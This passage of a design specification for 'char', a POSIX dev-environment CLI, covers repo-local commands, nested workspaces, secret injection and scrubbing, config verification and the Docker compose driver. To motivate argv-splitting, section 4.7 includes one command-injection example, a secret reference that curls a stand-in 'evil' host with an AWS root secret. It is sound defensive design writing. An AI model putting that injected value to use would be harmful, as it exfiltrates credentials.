> and a repo's own checks are trusted by definition. Starlark would mean executing repo code to
> learn **what the config says at all**. That kills pass 1: there is no static pass over a
> program, so the schema constrains nothing, `char agents-md` cannot render without evaluating,
> and the seconds-long feedback loop that makes layer 3 usable disappears. The cheap pass is
> the one worth protecting.

### 4.5 `commands:` — repo-local verbs char does not own

The six verbs are universal. Every repo also has commands that are **only** meaningful in
that repo, and char must not swallow them or force them elsewhere. A top-level `commands:`
block, sibling of `components:`, declares them:

```yaml
commands:
  worktrees:
    cmd: uv run scripts/worktrees.py
    help: Create and tear down git worktrees
    env:
      WORKSPACE: ${workspace.id}
      REGISTRY: ${env.COMPANY_REGISTRY}     # bare read; unset is bad_config
    secrets: [GITHUB_TOKEN]                 # explicit grant, §4.7
    owns:
      containers: "label=com.example.worktree=${workspace.id}"
      files: [".worktrees/${workspace.id}"]
  tickets:
    cmd: uv run scripts/tickets.py
```

`env:` is additive — the parent environment is inherited wholesale and these are layered on
top, so a command needing `$HOME` already has it.

`stdio:` is `inherit` or `pipe`, and **its default is inferred: `pipe` when the entry grants
secrets, `inherit` otherwise.** Piping lets char scrub its output; inheriting preserves the
child's TTY, so colours, progress bars and interactive prompts work.

The default is only a default. char must not decide this by inference alone, because
inference is wrong in both directions: a `deploy.sh` that holds a token *and* prompts for
confirmation needs `inherit` despite its grant, and a command with no grant that fetches its
own token internally and logs it needs `pipe` despite having none. The repo knows; char
cannot.

**`--json` overrides `stdio:` and forces `pipe`.** With `inherit` the child writes to char's
own stdout, and char then writes the envelope to the same descriptor — so the one consumer the
envelope exists for receives interleaved child output and JSON. §6's rule that "`--json` means
stdout carries the envelope and nothing else" applies to dispatched commands too; `stdio:`
chooses between `inherit` and `pipe` only when char is not emitting a machine-readable payload.

**`stdio: inherit` alongside a `secrets:` grant is permitted, and disables scrubbing for that
entry.** char still writes nothing itself — the child writes straight to the terminal — but
§4.7's practical protection does not apply. Two deliberate keys in one block is a clear
enough signal of intent; making it an error would leave the interactive-command-with-a-token
case unserviceable, forcing that script to fetch its own secret and putting it *outside*
char's management rather than inside it.

> **Reserved, not built: `stdio: pty`.** A pseudo-terminal gives the child a TTY while char
> still sees the bytes, which recovers colour and progress-bar fidelity under scrubbing. It
> is cleanly POSIX, so it costs nothing that §7 has not already given up. Output-only is
> modest; interactive *input* — raw mode, `SIGWINCH` forwarding — is where it gets expensive,
> and no fixture needs it yet.

`owns:` behaves exactly as it does under `run:` (§6.1), with one difference: it is a
**selector, not a record.** char stores the declaration and `char clean` *evaluates* it
against docker and the filesystem. That works because every selector is stamped with
`${workspace.id}`, and it means no lifecycle hook and no `owned` row written — a command
runs ad hoc, so there is no "while it was up" window to record against. `ports:` is not
available here; the block is already claimed by `char init`.

`char worktrees prune --dry-run` runs `uv run scripts/worktrees.py prune --dry-run` from the
workspace root. char is a dispatcher here and nothing more: remaining argv passes through
untouched, and **the command's exit code is returned verbatim** rather than being mapped into
char's own codes — char did not decide the outcome, so it does not get to classify it.

**That collides with char's own map, and the envelope resolves it.** char assigns meanings to
`1`–`5` and `70` (`ARCHITECTURE.md` §1.6), so a child exiting `3` is on its face
indistinguishable from char's own `bad_config`. Two things make it unambiguous:

- **char's own error codes can only occur when the child did not run.** If the child ran at
  all, dispatch succeeded — so any code after that point is the child's.
- The envelope says which happened: **`data.dispatched`** is true only if the child was
  executed, and **`data.child_exit`** records its code.

Remapping the child's codes into a reserved band was considered and rejected: scripts return
meaningful codes their own callers already depend on, and rewriting them to protect char's
namespace breaks the thing `commands:` exists to preserve.

The same four substitutions apply and no others (§4.4) — plus `${env.NAME}` inside `env:`,
which is where env composition lives. `${files}` is simply never populated for a `commands:`
entry, since there is no scope to compute.

**A name may not shadow a built-in verb.** `config verify` rejects a `commands:` entry named
`init`, `up`, `down`, `check`, `clean`, `status`, `config` or `agents-md`. Without that rule
a repo can silently break the one guarantee the project exists to provide — that the six
verbs mean the same thing everywhere.

**Why this is in the config rather than a plugin mechanism.** It is the same argument as
§6.1: the thing a repo actually needs is a name and a command, not a lifecycle contract. This
is also what lets Chariot keep `worktrees` / `tickets` / `design` while giving up `check` and
`servers` (phase 6), so it is on the critical path rather than a nicety.

### 4.6 `workspaces:` — nested workspaces in one repo

**The default stays "packages are components."** A monorepo is one workspace, one port block,
one `.char/`, and per-package work is served by the scope lens that already exists —
`char check --component web`, `char check web:e2e`, `match:` globs scoping by changed files
(§3.2, §3.3). Reach for this section only when that is genuinely not enough.

The case it exists for: `apps/foo` and `apps/bar` are **separate products that happen to share
a repo**, and foo's services, ports and lifecycle must be independent of bar's. A root config
declares them:

```yaml
# repo root char.yml
version: 1
workspaces: [apps/foo, apps/bar]   # separate workspaces, excluded from this one
components:
  shared-lib:
    root: libs/shared
    checks: { lint: { cmd: "ruff check ${files}" } }
```

Each declared path holds its own `char.yml` and becomes an ordinary workspace: its own id,
its own port block, its own `.char/`.

**A nested workspace inherits nothing.** Its `char.yml` is complete on its own —
`secret_providers:`, `secrets:`, `commands:` and `components:` are *not* inherited from the
root, and a nested config that needs a provider declares it. "An ordinary workspace" is meant
literally: the only thing the root contributes is permission for it to exist. Inheritance was
left unstated in an earlier draft, which meant every reader had to guess, and the two obvious
guesses produce different configs. A root that is *nothing but* a manifest — `workspaces:`
with no `components:` — is legal, and is the honest shape for a repo of genuinely independent
products.

**No new runtime concepts.** Two workspaces sharing a checkout is structurally identical to
two git worktrees, which §2.2 already models as flat siblings. They share a `project_id`,
because they *are* the same repo — so `char status --project` reporting "foo is up, bar is
down" is the right answer, `char clean` still touches only your own workspace, and
`char clean --project` still touches both because that is the destructive option you have to
ask for.

**The thing that is actually illegal is overlap, not nesting.** If the root also claimed
`apps/foo` as a component root or reached into it with a `match:` glob, that subtree would
have two owners with two ids and two port blocks — the same source and services claimed
twice. So `config verify` asserts that no `components[].root` and no `match:` glob reaches
into a declared nested workspace.

**Why declared at the root rather than inferred.** Inferring — "any subtree containing a
`char.yml` is automatically excluded" — needs no configuration, but it means dropping a file
into a directory silently changes the root's behaviour, and an *accidental* `char.yml`
quietly becomes a workspace instead of an error. Declaring it keeps the stray-file case loud
(§2.1) while letting the deliberate case work.

> **Not built: config fragments.** A different need — one workspace whose config is split
> across per-package files for authoring reasons, rather than several workspaces. If that
> becomes real, the answer is an include mechanism that still resolves to a single workspace,
> **not** nested workspaces. Named here so nobody later reaches for the wrong one.

### 4.7 `secrets:` — tokens reach the process, never the transcript

char is the only thing in the stack that constructs the environment for every process in the
repo. That makes it the one place this can be fixed.

**The problem.** An agent runs `char up` and a service needs `STRIPE_SECRET_KEY`. Today that
means a `.env` file an agent will eventually read while debugging, or an `export` in a shell
history, or — worst — a token on the command line, visible in `ps` to every process on the
machine. And when a command echoes its environment on failure, char captures that into
`.char/run/<id>/logs/`, which is a file agents are *expected* to read.

```yaml
secret_providers:
  op:       { cmd: "op read ${ref}" }
  aws-sm:   { cmd: "aws secretsmanager get-secret-value --secret-id ${ref}
                     --query SecretString --output text" }
  keychain: { cmd: "security find-generic-password -s ${ref} -w" }

secrets:
  GITHUB_TOKEN: op://Engineering/github/token
  DB_PASSWORD:  aws-sm://prod/db#password

components:
  api:
    run:
      driver: command
      cmd: manage.py runserver 0.0.0.0:${port.api}
      secrets: [DB_PASSWORD]        # granted here, and nowhere else
```

The URI scheme selects the provider; `${ref}` is the rest of the reference.

**Provider names are URI schemes, so they use the scheme grammar — `^[a-z0-9][a-z0-9+.-]*$`
— not the name grammar used for components and checks.** The difference is one character:
`_` is legal in a component name and illegal in a scheme, so `aws_sm:` would be a provider
that can never be referenced. Narrower grammar, caught at parse.

**Five properties, each load-bearing:**

| | |
|---|---|
| **Reference, never value** | `char.yml` stays committed and diffable. It holds a pointer. |
| **Grants are explicit and per-entry** | A `run:`, `checks:` entry or `commands:` entry names what it needs. Least privilege, and `grep -n "secrets:"` answers "what can reach this token." |
| **Injected via env at spawn, never argv** | argv is world-readable through `ps`. |
| **char scrubs resolved values from everything it writes** | logs, `--json`, error messages, the live table. |
| **There is no retrieval verb** | No `char secret get`, ever. An agent can *use* a secret by running `char up`; it cannot *obtain* one. That asymmetry is the entire point. |

**char reads raw and writes scrubbed.** Scrubbing is a filter applied on the way *out*, never
a transform on the stream. So `ready: { log: <regex> }`, any `parse:` keys and exit-code
interpretation all see the real bytes, while the log file, `--json` and **the terminal** see
redacted ones. Scrubbing first would break a ready-check whose regex spans a redacted value —
`listening on postgres://.*@localhost` — and buys nothing.

The terminal counts as a write: if an agent runs `char up` and char streams service output,
that lands in the transcript. Which is why `stdio:` (§4.5) matters — char can only scrub what
it can see.

**Providers are commands, not integrations.** char must never grow 1Password, AWS or Keychain
SDKs. A provider is a command that prints a secret to stdout — char runs it through the
injected `run`, captures stdout, and never logs it. That is roughly a hundred lines with no
vendor lock-in, and it is the same instinct as §6 ("no vendor-named drivers") and §6.1
("`owns:` instead of a plugin API"). Vault, Doppler, `pass` and a homegrown script all work
on day one without char knowing they exist.

**Never cache a resolved secret to disk.** That is the rule, and it is about *disk* — writing
one is a new leak surface.

**In memory, for the lifetime of one char process, it is cached.** A run granting the same
secret to twenty checks would otherwise invoke the provider twenty times, which for `op` can
mean twenty biometric prompts. One process, one resolution; the process exits and the cache
is gone with it.

**Secrets are resolved *before* the process detaches.** `char check --detach` has no terminal
once it is detached, so a provider that prompts cannot prompt. Resolving while the terminal is
still attached is the difference between `--detach` working with 1Password and not working at
all.

Providers still do their own session caching — `op` already does, and that remains correctly
their problem rather than char's.

**What this does and does not guarantee.** char guarantees the secret is never in `char.yml`,
never in argv, never in char's own logs, `--json` or database, and never retrievable through
any char verb. char *cannot* stop an agent from running `op read` itself, cannot control a
command invoked outside char, and cannot defeat deliberate exfiltration through encoding.
Scrubbing is defense-in-depth, not a proof.

**And it cannot protect a secret from whatever it hands the secret to.** A grant to a
`driver: compose` service is **visible to anyone who can reach the Docker daemon** — measured:
`docker inspect --format '{{json .Config.Env}}'` returns it in cleartext. That is Docker's
trust model, not a charkit defect, and it is not fixable by char: even mounting the value as a
compose secret leaves it readable via `docker exec ... cat /run/secrets/<name>`. Daemon access
is root-equivalent to every container. Anyone running char already trusts Docker with the
workload; stating this plainly is worth more than machinery that moves the exposure without
closing it.

#### Five rules that are genuinely char's to enforce

1. **`${ref}` is passed as a single argv element, never through a shell.** A provider `cmd` is
   argv-split and the reference substituted into one slot. Otherwise
   `secrets: {X: "op://a; curl evil/$(op read op://Private/AWS/root)"}` is command injection
   that reads as an inert URI in review.
2. **Scrubbing happens at the value level, before serialization.** Filtering the serialized
   output fails the moment a value contains `"`, `\` or a non-ASCII byte, because the
   serializer escapes it first — char's own encoder defeating char's own filter.
3. **Provider failure output is never surfaced verbatim.** When a provider fails there is no
   resolved value registered to scrub against, so a chatty provider — `set -x`, `--debug` —
   leaks through a path structurally incapable of redaction. Report the provider name, its
   exit code, and a fixed message.
4. **`owns.release:` is recorded and reported, never executed** (§6.1). char therefore never
   resolves anything on that path, which is what keeps `char.db` free of secrets and secret
   references alike. `owns:` takes no `secrets:` grant.
5. **The detach handoff must not use char's own environment.** §4.7 resolves before detaching,
   and §4.5 inherits the parent environment wholesale to every child — so putting resolved
   values in char's own env would silently grant every secret to every child and void
   per-entry grants entirely. Pass them to the detached process over an inherited pipe closed
   after read. A test must assert that a check with **no** grant sees no secret in its
   environment during a run where a sibling check has one.

The win is narrower than "foolproof" and still large: **the default path becomes safe.** The
agent runs `char up`, the service gets its token, and nothing the agent can read ever
contained it. Today the default path is unsafe, and that is the actual bug.

**Schema lands in phase 1; implementation in phase 4**, when `up` exists and there is
something to inject into.

---

## 5. Bootstrap: the three-layer sandwich

**Do not write a stack-detection engine.** Do not infer intent. The split:

| Layer | Who | Produces |
|-------|-----|----------|
| **1. Deterministic scan** | char (`char config scan`) | An **evidence report**, never a config |
| **2. Authoring** | the agent | The `char.yml`, from evidence + schema + a worked example |
| **3. Deterministic verify** | char (`char config verify`) | Pass/fail with fix suggestions |

Layer 1 is safe precisely because it reports **facts, never intent**. "These 14 scripts
exist in package.json" cannot be wrong; "your test command is `pnpm test`" can. It emits:

- lockfiles and package managers found
- every `package.json` script, verbatim
- `pyproject` tool sections, `Makefile` targets
- compose services and their declared ports
- CI workflow steps — the best existing evidence of "what we actually run"
- workspace globs / monorepo layout

Layer 2 supplies what no scan can: which of four test scripts is canonical, which suite is
slow enough to deserve `cost: 4`, which two cannot share a browser, what genuinely needs
Postgres.

**Layer 3 runs in two passes, and only the first is cheap.**

```
pass 1  STATIC     schema, references, argv[0] resolvability, glob coverage
                   seconds; nothing is executed; failures short-circuit here

                   argv[0] resolvability applies to argv-split entries only.
                   Under `shell: true` there is no argv[0] to resolve — the
                   string is a program in a language char does not parse, and
                   `VAR=x exec "$TOOL"` has no first word that is a command.
                   verify reports those entries as `unchecked`, with a count,
                   rather than guessing or silently passing them. That count
                   is the honest cost of `shell: true` and is worth seeing.
pass 2  FOR REAL   run the check suite properly, exactly as `char check` would
```

**Pass 2 is a real run, not a simulation.** An earlier draft had verify "dry-invoke every `cmd`
and `fix` with `--help` / `--version` / `--dry-run`", which was the worst of both worlds:
char cannot know which of those three flags a given tool accepts, so against the fixture set it
would either **run the Playwright suite** (`pnpm e2e` ignores unknown flags), **create a
Kubernetes cluster** (`./scripts/kind-up.sh` likewise), or **fail a correct config** (`mix
dialyzer` errors on an unrecognised flag). Guessing a flag is not verification.

If you want to know a config works, run it. That is what pass 2 does, and it inherits `check`'s
semantics wholesale: a check declaring `needs:` starts its services (phase 4), and **verify
does not stop what it started** — same rule, same reason (§3, phase 3).

**Consequence, stated plainly:** `char config verify` is *not* a seconds-long check. Pass 1 is,
and catches the hallucinated script name that motivated layer 3 in the first place. Pass 2
takes as long as the repo's checks take — which for `python-ml` is thirty minutes. An authoring
loop that iterates on pass-1 failures stays fast; a full verify is a real build.

**Layer 3 is load-bearing.** Agents *will* hallucinate config — a plausible script name that
does not exist, a flag from a different version. `config verify` catches it in seconds
instead of on the first real run, in a fresh worktree, at the worst moment. It checks:

- schema validation
- **resolves every `cmd` and `fix`** — splits `argv[0]` and checks it is on `PATH` or is an executable file under the component root
- `needs:` refs resolve to a real component or a real check id, and the check-id graph is acyclic
- declared ports fit the block
- every `match:` glob hits at least one file
- no `commands:` entry shadows a built-in verb (§4.5)
- every `in:` names a component whose `run.driver` is `compose`
- no two components declare the same `ports:` name — `${port.NAME}` is workspace-global
- *(the schema already makes `shell: true` with `${files}` unrepresentable — see §4.1)*

> **Deliberately not checked: an `exclusive:` name used only once.** An earlier draft rejected
> that as a typo. Since §4.3 made exclusives **machine-wide**, a name used once in a repo still
> excludes every other workspace on the machine — which is the entire point of the change. The
> rule survived it unrevisited and would now reject §4.1's own example (`exclusive: [browser]`,
> used once) and the `python-ml` fixture's single GPU. A typo'd exclusive name is now harmless:
> it names a mutex nobody else contends for.
- no `components[].root` or `match:` glob reaches into a declared nested workspace (§4.6),
  and every path in `workspaces:` actually contains a `char.yml`
- every granted secret name is declared in `secrets:`, and every reference's URI scheme
  matches a declared `secret_providers:` entry (§4.7). **Never resolves a secret** — the
  reference is checked, the value is not fetched
- no `components[].root` escapes the workspace root. **The schema rejects a leading `/` and a
  leading `..`; verify owns this rule because only verify can normalise `a/../../b`** — and an
  outside-root `root:` breaks the id derivation §2.2 depends on. Multi-repo is reserved (§7)
- `owns.files` paths that survive normalisation still land outside the workspace when the
  name is a symlink. verify resolves each one and rejects it if the target escapes; the schema
  cannot, and `clean` deletes what these name

> **Four rules that read like verify checks are enforced by the schema instead**, because they
> are properties of a single string or key with nothing to cross-reference: `shell: true`
> combined with `${files}`; `owns.files` being relative with no `..` and no leading `/`; a
> `commands:` entry shadowing a built-in verb; and `${env.NAME}` placement plus the `??` ban.
> The rule is worth stating in general form, because it decides where every future check
> goes: **if it needs a second part of the document, or the filesystem, it is verify; if it
> can be decided from the value in front of you, it is the schema.** A schema rejection is a
> parse error at every entry point, including the ones nobody remembered to route through
> verify.

### 5.1 `char agents-md`

Writes a managed block into `AGENTS.md`, generated from the *resolved* config so it lists
real component and check names.

- `--write` rewrites only between `<!-- char:begin -->` / `<!-- char:end -->`; anything
  outside is untouched. No markers → appends once, at the end.
- `--verify` exits non-zero if the block is stale, so it can be an ordinary check in
  `char.yml`.
- Bare invocation prints to stdout, for repos that do not want a managed block.

---

## 6. Service drivers

**Two drivers only. No vendor-named drivers — no `tilt`, no `bazel`, no `make`.**

| Driver | Behavior |
|--------|----------|
| `compose` | **Resolve → transform → emit.** See §6.0 — this is not a matter of adding flags to `docker compose`. |
| `command` | Spawns detached in its own process group, records the pid, waits on the ready-check, kills the whole group on `down` — **SIGTERM, 10s grace, then SIGKILL**. Covers a supervisor, `pnpm dev`, `manage.py runserver`, a Procfile line — anything. |

**The escalation is unconditional, not a retry.** Measured: `killpg(SIGTERM)` against a group
whose leader runs `trap '' TERM` kills nothing — 3 processes before, 3 after — because children
inherit an ignored disposition across `fork` and `exec`. One uncooperative leader immunises its
whole group, and sending SIGTERM again achieves exactly as much as the first one did. `down`
reports `DOWN` only after the group is confirmed gone.

**One case escalation does not fix:** a service that calls `setsid` itself — ordinary
daemonizing — leaves the tracked group, so its recorded pgid is not the one it runs under and
no `killpg` reaches it. That is detected after the fact, by the port still being bound once
`down` claims success, and reported. Phase 2's done-when ("no process outlives its workspace")
must be tested against a SIGTERM-ignoring service and a self-`setsid` one; a cooperative
`sleep` passes while proving nothing.

**Every docker invocation carries char's own timeout — default 30s, `docker_timeout` in
`~/.char/config.toml`.** The CLI has none: measured against a socket that accepts and never
replies, `docker ps` and `docker compose up -d` were both still running at 30 seconds with no
output. The invocation that matters most is the `docker ps` in `init`'s reap pass, because
without a timeout a hung daemon wedges *every new workspace on the machine*, including the verb
whose job is recovery. A timeout on a docker call is class `environment`, not `timeout` — the
repo is fine, the machine is not.

**char probes the daemon before doing compose work.** Measured: `docker compose config`
returns 0 against a dead daemon, because it is client-side — so §6.0's steps 1 through 3 all
succeed and char discovers the daemon is gone only at step 4, having done everything else
first. One `docker version` up front turns that into an immediate `environment` failure.

### 6.0 The compose driver

An earlier draft specified this as *"shells out to `docker compose` with a project name
derived from the workspace id, port mappings rewritten into the claimed block,
`--label char.workspace=<id>`."* **Two thirds of that is impossible.** `docker compose` has no
`--label` flag, and port mappings cannot be rewritten from the command line at all. Only the
project name was achievable. See §6.2 for what was measured.

The mechanism is four steps:

```
1. RESOLVE   docker compose -f <base…> -p char-<id> \
                 --project-directory <workspace-root> config
             → one canonical document, with interpolation, extends:, anchors
               and relative paths already resolved

2. TRANSFORM ports[].published      → the claimed block
             labels.char.workspace      → <id>       (every service)
             labels.char.workspace_path → <realpath>
             build.labels.<both of the above>        (services that build)
             networks.<n>.labels.<both>              TOP-LEVEL, not inherited
             volumes.<n>.labels.<both>               TOP-LEVEL, not inherited

3. HOLD      in memory - never written to disk (see below)

4. RUN       <document on stdin> | docker compose -f - -p char-<id> \
                 --project-directory <workspace-root> up -d
```

**The resolved document is never written to disk.** It exists in char's memory and on the
compose process's stdin, and nowhere else.

**Why generate a whole file rather than an override.** Because an override cannot do the one
thing it would be for: compose **appends** to `ports:` rather than replacing, so the base
port stays published and every workspace still binds it — the exact collision this project
exists to prevent. The `!override` tag fixes that on Compose ≥ 2.24.4 and is **silently ignored below
it** — you get the appended base port, and a collision, with no error. Depending on a merge
feature that fails silently in the older direction is not something to build a design on when
a repo's developers are, normally, on different Compose versions.

**Why char never parses compose semantics.** Step 1 hands that entire problem to compose
itself. char rewrites two keys in a document compose has already normalised, which is why
this works on any version and why `extends:`, YAML anchors and `${VAR}` interpolation are not
char's problem.

**Why it is not persisted, which an earlier draft got wrong.** That draft wrote the document
to `.char/compose.yml` and called it "inspectable and diffable." Measured: `docker compose
config` **resolves `env_file:` and `${VAR}` interpolation and emits the values inline** —

```yaml
# from a repo's own .env, with no char involvement at all
environment: { INLINE: sentinel-from-envfile, SECRET_TOKEN: sentinel-from-envfile }
```

— so persisting it manufactures exactly the artifact §4.7 exists to eliminate: *"a `.env` file
an agent will eventually read while debugging."* It does so **for every repo**, including repos
that never adopt char's secrets mechanism. Those values never passed through char, so the
scrubber has never seen them and **structurally cannot redact them**. `ARCHITECTURE.md` §1.8's invariant — a
resolved secret is never written to `.char/` — would be violated by construction.

Piping to `-f -` is verified to accept the document and produce identical resolved output.

**There is deliberately no `--dump-compose` flag either.** A draft added one, redacting every
`environment:` and `env_file:` value — but what survives redaction is a port map and two
labels, and both are already reported: ports in `data.results[].ports` (§3.1), labels by
`docker inspect`. It bought a fourth call site for the scrubber and a file path an error
message would helpfully suggest to a stuck agent, in exchange for information available two
other ways.

When `up` goes wrong, the port transform is visible in `data.results[].ports`, what the
container actually received is visible in `docker inspect`, and what char *would* do is visible
in `char up --dry-run` (§3.3.1).

**Ownership falls out.** Containers and networks carry `com.docker.compose.project=char-<id>`
(compose applies it automatically from `-p`) plus the two char labels from the transform —
`char.workspace` and `char.workspace_path` (§2.3). `clean` uses the char labels, so it stays
driver-agnostic, and reaping stats the path rather than trusting the database (§2.3.1).

**Images, narrowed.** char labels only images it causes to be *built*, via `build.labels`. A
pulled image such as `postgres:16` is shared with the rest of the machine and was never
char's to remove. This corrects an earlier claim in §2.3 that stamping meant "passing the
label through to compose" — it does not — and it matches the evidence, which is ~2.1 GB per
production app **build**.

**Ready-check kinds — five, and this is the enumeration.** Each carries its own timeout, and
each applies to both drivers.

| Kind | Ready when |
|---|---|
| `http` | a GET returns 2xx |
| `tcp` | the port accepts a connection |
| `log` | a regex matches the service's stdout |
| `exec` | a command exits 0 |
| `none` | immediately on spawn — the service is fire-and-forget |

An earlier rewrite of this section dropped the list while [`PHASES.md`](PHASES.md) went on
promising "five ready-check kinds" that were then enumerated nowhere. Naming five kinds is not
a spec, so here is the encoding:

```yaml
ready: { http: "http://127.0.0.1:${port.api}/healthz", timeout: 60 }
ready: { tcp: pg }              # a declared port NAME, not a number
ready: { log: "listening on" }  # an unanchored regex over the service's stdout
ready: { exec: "pg_isready -q" }
ready: { none: true }
```

**Exactly one kind key, plus an optional `timeout:` in seconds — default 60.** A mapping with
two kind keys is `bad_config` rather than a precedence rule nobody would remember. `tcp:`
takes a port *name* because a number would be the pre-claim port, which is never the one the
service is on. `ready:` omitted defaults to `{ none: true }`, and `char up` then reports `UP`
on spawn — which is why the fixtures that have a real health endpoint declare one.

**`file:` accepts a list.** Repos commonly already run base-plus-override, and step 1 must
receive the same file set they do. char also ignores ambient `COMPOSE_FILE` and
`COMPOSE_PROJECT_NAME`, passing `-f` and `-p` explicitly every time, so the result does not
depend on the caller's environment.

> **Measured Docker behaviour lives in [`traps.md`](traps.md), which owns it.** An earlier
> draft reproduced all six measurements here, which meant two copies of a fact whose whole
> value is being trustworthy — and `traps.md`'s own rule is *re-run rather than re-trust*.
> Read the Docker Compose section there before designing anything that depends on how
> compose behaves.

#### The three `owns:` key sets

`owns:` appears in three places and they are **not** the same set. Enumerated, because "like
any other entry" was doing work no reader could check:

| Key | under `run:` | at component level | under `commands:` |
|---|:--:|:--:|:--:|
| `containers` `networks` `images` | yes | — | yes |
| `ports` | yes | — | **no** (§4.5) |
| `files` | yes | yes | yes |
| `release` | yes | yes | yes |

Component-level `owns:` records what `setup:` created and therefore has no runtime handles;
`commands:` cannot own ports because it never claims a block. `release:` is recorded and
reported, never executed, everywhere it appears — so it takes no `secrets:` grant anywhere
(§4.7 rule 4).

### 6.1 `owns:` — the extension point instead of a plugin API

Do **not** build a driver plugin system. It means a public lifecycle contract, error
semantics, and a versioning story — permanent API surface for a third driver that may never
arrive. `driver: command` already *is* the plugin system.

The one thing a first-class driver gives you that a bare command cannot is knowing what it
created, so `clean` can reclaim it. So let a `command` component declare that directly:

```yaml
components:
  cluster:
    run:
      driver: command
      cmd: ./scripts/kind-up.sh ${port.api}
      stop: ./scripts/kind-down.sh
      ready: { exec: "kubectl get ns example" }
      owns:
        containers: "label=io.x-k8s.kind.cluster=char-${workspace.id}"
        images: "label=char.workspace=${workspace.id}"
        # declared selectors may use the id alone; char's own filters use BOTH labels
        ports: [api]
        files: [".kube/char-${workspace.id}.conf"]
```

#### `owns:` at component level — what `setup:` created

`owns:` also appears directly on a component, where it describes what **`setup:`** produced
rather than what `run:` started. This closes a hole in §1's thesis: *"you cannot clean up what
you never claimed, and claiming happens at init"* — but `setup:` was the one thing that
created and never claimed.

```yaml
components:
  api:
    setup: ["bundle install", "rails db:create", "rails db:migrate"]
    owns:
      files: [node_modules, .venv]
      release: psql -h db.internal -c 'DROP DATABASE app_${workspace.id}'
```

**Only one of these is a genuine leak, and it is not the obvious one.** Three categories:

| `setup:` creates | Lives | Leaked when the directory is deleted? |
|---|---|---|
| `node_modules`, `.venv`, `target/` | inside the workspace | **No** — dies with it |
| A database inside a char-owned container | inside a labelled container | **No** — dies with the container |
| A database on a shared server, a cloud resource | outside char entirely | **Yes** |

So `rails-monolith`'s `db:create` is only a leak when Postgres is shared rather than a
char-managed service.

**`release:` is recorded, reported, and never executed by char.** An earlier draft had `clean`
run it — including under `--orphaned`, from outside any workspace, resolving granted secrets at
that moment. That made the most destructive operation in the tool run under the flag §3.3
documents as *"always safe… it can never disturb a live agent."*

The plan already faces this exact choice for orphaned process groups and answers it correctly
(§2.3.1): **report it, do not act on state char cannot prove is stale.** A stale
`DROP DATABASE` is strictly more dangerous than a stale `kill`, so the same answer applies with
more force.

```
char status --all
  workspace a3f91c02 (directory deleted) declared an external resource
  char did not reclaim:
      psql -h db.internal -c 'DROP DATABASE app_a3f91c02'
```

Two mechanisms disappear with it: `char.db` never stores a secret *reference*, and
`ARCHITECTURE.md` §1.8's invariant needs no clause about them.

It is still recorded at `char init` rather than read from the repo at `clean` time — A teardown script symmetric with `setup:` would
live *in the workspace* — so in the orphan case, the one that actually matters, it has been
deleted along with everything else. A resolved command string in the machine-global store runs
from anywhere:

```
declared   psql -h db.internal -c 'DROP DATABASE app_${workspace.id}'
recorded   psql -h db.internal -c 'DROP DATABASE app_a3f91c02'
           reported   by char status --all when the workspace is gone — never executed
```

**Only the command and the references are recorded.** Recording a resolved credential would
put a plaintext secret in `char.db` permanently, surviving `clean` by design — which is why
`ARCHITECTURE.md` §1.8's invariant now names that database explicitly. 

**`files:` are removed only by `char clean --artifacts`, never by plain `clean`.** They cost
disk but leak nothing machine-global, and deleting them means the next `init` pays a full
reinstall — minutes an agent did not ask to spend. `--artifacts` composes with the scope lens,
so `char clean --artifacts --all` is the reclaim-disk-on-this-machine answer. It is a no-op
under `--orphaned`, where the directory and its files are already gone.

**char never guesses which files are artifacts.** Inferring `node_modules`, `.venv`, `.next`
from a repo scan is a stack-detection engine, which §5 rules out. They are declared, or they
are not char's.

~60 lines instead of a plugin API, no versioned contract, and `clean` stays correct for
resources char never created directly. If a third real driver ever proves necessary, `owns:`
is the interface you would have designed anyway.

---

## 7. Non-goals

Each of these is a plausible-sounding feature that multiplies maintenance without moving any
of the five verbs.

- **Inferring intent from a repo scan.** Layer 1 reports facts only.
- **A build DAG with caching.** turbo and nx own this: task graphs over build outputs, content
  hashing, cache restore. char has none of it. It *does* schedule checks under constraints —
  `needs:` ordering **between checks as well as against components** (§4.1), a `cost:` budget,
  `exclusive:` mutexes — which is a scheduler, not a build graph, and `ARCHITECTURE.md` §1.2
  spends a page on getting it right. **The line is outputs:** char knows that one check runs
  after another passes; it never learns what a check produced, whether that output changed, or
  whether the work could have been skipped. Content hashing, cache restore and staleness stay
  out, and the moment any of them arrives char has become turbo, badly. An earlier draft phrased
  this non-goal as "task dependency DAG", which disclaimed something the design contains and
  would therefore have stopped nothing.
- **A driver plugin system.** See §6.1.
- **Mandatory output parsing.** Optional `parse:` keys only. Exit code plus captured stream
  must *always* be a complete answer, or every upstream tool release breaks you.
- **A growing MCP surface.** One thin wrapper over the same importable layer. The CLI with
  `--json` works in harnesses with no project-scoped MCP at all.
- **Secrets management beyond injection.** §4.7 resolves a reference and injects it. char
  does **not** store, generate, rotate, share or sync secrets, and does not implement a
  provider — a provider is a command that prints to stdout. The moment char holds a secret at
  rest it has become a secrets manager, and there are better ones.
- **Windows support.** Process groups, signals and file locks are load-bearing. Say
  POSIX-only in the README's first paragraph.
- **Multi-repo workspaces — reserved, not built.** `components[].root` is already a path;
  letting it point outside the workspace root (`root: ../api`) would get ~80% of multi-repo
  for free. Costs: a git diff *per* root rather than one, and the id can no longer be "hash
  of one path". Worth doing, but only once the two-repo setup actually exists.

---

## 8. Phases

> **Moved to [`PHASES.md`](PHASES.md).** Sequencing changes every phase and is read one
> section at a time; this document is the contract and is frozen once phase 1 lands.

---

## 9. Source material

> **Moved to [`PHASES.md`](PHASES.md).**

---

## 10. Decisions already made — do not relitigate

| Decision | Choice | Why |
|----------|--------|-----|
| Language | **Rust** (2021 edition) | **Reopened and re-decided in phase 0 — see below.** The reducer's `State`/`Event`/`Action` types are the scheduler's specification, and Rust is the only candidate whose compiler enforces that specification. |
| Package name | **`charkit`** | `char` is taken on crates.io. Binary stays `char`; the package name appears once, in the bootstrap line. |
| Distribution | **GitHub Releases + `install.sh`** | A single static binary — a ~2 MB floor, measured — with no runtime to provision. Homebrew tap later. |
| Supervision | **Start-and-track only** | Restart-on-crash and log aggregation are a permanent bug class for marginal gain. |
| Config shape | **One `components:` mapping** | `units` + `services` were the same thing split in two; the both-axes case read as duplication. |
| Config format | **YAML, statically verifiable** | Generator script is the escape hatch. Starlark would force `config verify` to execute untrusted code. |
| Driver extensibility | **`owns:`, not a plugin API** | Gets the one real benefit of a custom driver at ~60 lines. |
| Concept naming | **Keep "workspace"** | Already means this in VS Code / Terraform / cargo / pnpm. Do not invent vocabulary for concepts that already have names. |
